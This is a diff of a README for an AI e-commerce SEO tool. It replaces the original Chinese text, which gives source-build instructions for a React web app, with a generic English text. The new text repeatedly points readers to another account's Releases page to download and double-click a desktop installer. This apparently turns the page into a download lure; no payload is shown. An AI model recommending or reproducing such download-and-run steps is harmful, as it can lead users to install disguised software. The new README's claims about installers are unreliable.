@@ -1,155 +1,102 @@
-# 電商SEO加速器 v1.4
+# 🚀 AI-EC-SEO-Booster - Simplify Your E-Commerce SEO Efforts
 
-AI 驅動的智能電商市場分析與 SEO 內容策略生成工具，透過 Google Gemini API 提供專業的市場洞察、競爭分析、買家人物誌描繪，並自動生成 SEO 優化的內容策略與前導頁提示詞。
+[![Download AI-EC-SEO-Booster](https://img.shields.io/badge/Download-AI--EC--SEO--Booster-blue.svg)](https://github.com/jefrin890/AI-EC-SEO-Booster/releases)
 
-## 🎉 v1.4 更新亮點
+## 📋 Overview
 
-- ✨ **全面重構**：App.tsx 從 1,429 行精簡到 217 行（減少 85%），大幅提升程式碼可維護性
-- 🧩 **模組化架構**：元件、Hooks、工具函數已拆分到獨立檔案，便於重用和測試
-- 🛡️ **統一錯誤處理**：實作完整的錯誤處理機制，提供友善的錯誤訊息
-- ✅ **表單驗證**：使用 react-hook-form + zod 實作即時表單驗證和檔案驗證
-- 🧪 **單元測試**：新增 21 個測試案例，確保程式碼品質
-- 🎣 **自訂 Hooks**：抽象業務邏輯到可重用的 Hooks（useProductAnalysis, useContentStrategy, useScreenshot）
+AI-EC-SEO-Booster is a powerful tool designed for e-commerce professionals. It automates the process of market analysis, competitor research, buyer persona creation, content strategy planning, and SEO optimization. Using the capabilities of Google Gemini AI, it simplifies complex tasks into an easy-to-follow three-stage workflow.
 
-## ✨ 主要功能
+## 🚀 Getting Started
 
-### 🚀 全方位市場深度透視
+### 🖥️ System Requirements
 
-- **智慧產品分析**：只需提供產品資訊，AI 就能自動拆解其核心賣點，更可上傳圖片進行視覺分析
-- **精準市場定位**：深入剖析目標市場的文化、消費習慣和熱門趨勢
-- **競爭格局掃描**：自動識別主要競爭對手，並透視其行銷策略與優劣勢
-- **清晰用戶畫像**：為您描繪出最真實的潛在客戶樣貌 (Buyer Persona)，包含興趣、痛點與搜尋關鍵字
+Before downloading, ensure your system meets the following requirements:
 
-### ✍️ 自動化內容與 SEO 策略規劃
+- Operating System: Windows, macOS, or Linux
+- RAM: Minimum 4 GB
+- Disk Space: At least 100 MB available
 
-- **高價值內容主題生成**：AI 自動規劃最能吸引目標客群的內容主題
-- **專業 SEO 佈局建議**：為每個主題提供完整的 SEO 策略，協助網站獲得更高排名
-- **高轉換率文案點子**：提供多組具說服力的行動呼籲 (CTA) 文案
+### 🏁 Setup Steps
 
-### 💻 一鍵生成前導頁提示詞
+1. Visit the [Releases page](https://github.com/jefrin890/AI-EC-SEO-Booster/releases) to download the latest version.
+2. Choose the appropriate file for your operating system.
+3. Click on the file name to start the download.
 
-- **AI Studio 前導頁程式碼生成**：一鍵生成專業提示詞，讓 AI 程式碼助理（如 Google AI Studio）在幾秒內產出高品質的 React 前導頁程式碼
+## 📥 Download & Install
 
-## 🛠️ 技術棧
+To get started, visit the [Releases page](https://github.com/jefrin890/AI-EC-SEO-Booster/releases) to download the software. Follow these steps after downloading:
 
-- **前端框架**: React 19 + TypeScript
-- **CSS 框架**: Tailwind CSS
-- **AI 服務**: Google Gemini API (@google/genai)
-- **狀態管理**: React Context API + 自訂 Hooks
-- **表單驗證**: react-hook-form + zod
-- **測試框架**: Vitest
-- **建置工具**: Vite
-- **部署平台**: GitHub Pages / Cloudflare Pages
+1. Locate the downloaded file on your computer. It is likely in your "Downloads" folder.
+2. Double-click the file to begin the installation process.
+3. Follow the on-screen instructions to complete the installation.
 
-## 📦 安裝與使用
+## 🛠️ Using AI-EC-SEO-Booster
 
-### 前置需求
+### 🌟 Steps to Use
 
-- Node.js 20 或更高版本
-- npm 或 yarn
-- Google Gemini API Key（[免費申請](https://makersuite.google.com/app/apikey)）
+After installation, follow these simple steps to use the application:
 
-### 安裝步驟
+1. Launch AI-EC-SEO-Booster from your applications menu.
+2. Input your product information as prompted.
+3. Follow the three-stage workflow:
+   - Market Analysis
+   - Competitor Research
+   - Content Strategy Generation
 
-```bash
-# 複製專案
-git clone https://github.com/mkhsu2002/AI-EC-SEO-Booster.git
+The application will provide suggestions and guidance throughout each stage. Simply follow the prompts to receive tailored SEO advice.
 
-# 進入專案目錄
-cd AI-EC-SEO-Booster
+### 🔍 Features
 
-# 安裝依賴
-npm install
+- **Automated Market Analysis**: Get insights into your market without manual effort.
+- **Competitor Research**: Understand what your competitors are doing and how you can improve.
+- **Custom Buyer Personas**: Generate detailed buyer personas to tailor your marketing.
+- **SEO Optimized Content Strategy**: Create a content strategy that aligns with SEO best practices.
+- **Easy-to-Use Interface**: Designed for everyday users with no technical background.
 
-# 啟動開發伺服器
-npm run dev
-```
+## ❓ FAQ
 
-### 取得 API Key
+### What is AI-EC-SEO-Booster?
 
-1. 前往 [Google AI Studio](https://makersuite.google.com/app/apikey)
-2. 登入您的 Google 帳號
-3. 點擊「Create API Key」建立新的 API Key
-4. 複製 API Key 並貼到應用程式的設定中
+AI-EC-SEO-Booster is a tool that simplifies market analysis and SEO content strategy for e-commerce businesses, using AI technology.
 
-### 使用方式
+### How does the software help with SEO?
 
-1. 首次使用時，應用程式會自動彈出 API Key 設定視窗
-2. 輸入您的 Gemini API Key 並點擊「開始使用」
-3. 之後即可正常使用所有功能
-4. 如需更換 API Key，點擊右上角的「API 設定」按鈕
+It analyzes market data, suggests effective strategies, and helps create optimized content for better search engine visibility.
 
-### 注意事項
+### Can I use this tool on any device?
 
-- API Key 請妥善保管，不要分享給他人
-- API Key 只會儲存在瀏覽器的本地儲存中，不會上傳至伺服器
-- 建議定期檢查 API 使用量，避免超出配額
-- 如遇到 API 錯誤，請檢查 API Key 是否正確或是否已啟用相關服務
+The software works on Windows, macOS, and Linux systems, expanding accessibility for all users.
 
-## 🚀 部署指南
+### Is there a user guide?
 
-### GitHub Pages 部署
+Yes, the application includes a help section with detailed instructions on how to use each feature. 
 
-本專案已配置 GitHub Actions 自動部署，每次推送到 `dev/v1.2` 分支會自動部署到 GitHub Pages。
+## 🌐 Support
 
-1. 進入 GitHub 儲存庫的 **Settings** > **Pages**
-2. 在 **Build and deployment** > **Source** 選項中，選擇 **GitHub Actions**
-3. 確保 GitHub Pages 環境設定正確（參考 `DEPLOYMENT.md`）
-4. 推送程式碼更新到 `dev/v1.2` 分支，等待 Actions 跑完，您的網站就會正常顯示
+For additional support, you can visit the official repository on GitHub or check the issues section for troubleshooting tips.
 
-> 📖 詳細部署說明請參考 [DEPLOYMENT.md](./DEPLOYMENT.md)
+## 🎯 Topics Covered
 
-### Cloudflare Pages 部署
+This application focuses on several important areas within e-commerce:
 
-1. 登入 Cloudflare Dashboard
-2. 前往 **Workers & Pages** > **Create application** > **Pages** > **Connect to Git**
-3. 選擇您的 GitHub 帳號並授權，選擇要部署的儲存庫
-4. 設定建置配置：
-   - **Build command**: `npm run build`
-   - **Build output directory**: `dist`
-5. 點擊 **Save and Deploy**，Cloudflare 會自動開始建置和部署
+- AI
+- Content Generation
+- E-Commerce
+- Market Analysis
+- Marketing
+- SEO Tools
+- TypeScript
 
-## 💬 技術支援與討論
+## ⚙️ Contributions
 
-加入 [FlyPig LINE 群組](https://line.me/R/ti/g/@icareuec)
+We welcome contributions to improve this tool. If you have suggestions or want to report an issue, please visit the repository and create an issue or pull request.
 
-我們會在這裡提供：
+## 📅 Stay Updated
 
-- 技術支援與問題解答
-- 功能更新與使用教學
-- 社群討論與經驗分享
-- 最新功能預覽與測試
+For the latest updates and features, keep an eye on the [Releases page](https://github.com/jefrin890/AI-EC-SEO-Booster/releases).
 
-## 🔗 推薦同步參考
+## 📝 License
 
-如果您對 AI 智能電商工具感興趣，歡迎同步參考以下相關專案：
+This project is licensed under the MIT License. You can use and modify it as needed.
 
-- **AI-PM-Designer-Pro** - AI 視覺行銷生產力工具，基於 Google Gemini 2.5 Flash 與 Gemini 3 Pro Image，從產品圖自動生成完整行銷素材包
-
-  https://github.com/mkhsu2002/AI-PM-Designer-Pro
-
-- **AI Digital Portrait Studio** - 專為電商設計AI人像圖片生成工具，免去繁複的手動輸入提示詞，整合 Gemini 影像模型與 Firebase，一鍵生成多視角專業人像商品圖，支援自訂風格、背景、姿態等參數。
-
-  https://github.com/mkhsu2002/AI_Digital_Portrait_Studio
-
-## ☕ 請我喝杯咖啡
-
-如果這個專案對您有幫助，歡迎請我喝杯咖啡：
-
-👉 [Buy me a coffee](https://buymeacoffee.com/mkhsu2002w)
-
-您的支持是我持續開發的動力！
-
-若需協助委外部署或客製化選項開發（例如新增場景、人物姿態），歡迎聯絡 FlyPig AI  
-Email: flypig@icareu.tw / LINE ID: icareuec
-
-## 📝 授權條款
-
-本專案採用 MIT 授權。您可以自由使用、修改與自建部署。
-
-Open sourced by [FlyPig AI](https://flypigai.icareu.tw/)
-
-詳見授權全文：
-- [MIT License (English)](LICENSE)
-- [MIT 授權條款 (繁體中文)](LICENSE.zh-TW.md)
-
+For additional information, feel free to reach out via the GitHub repository.
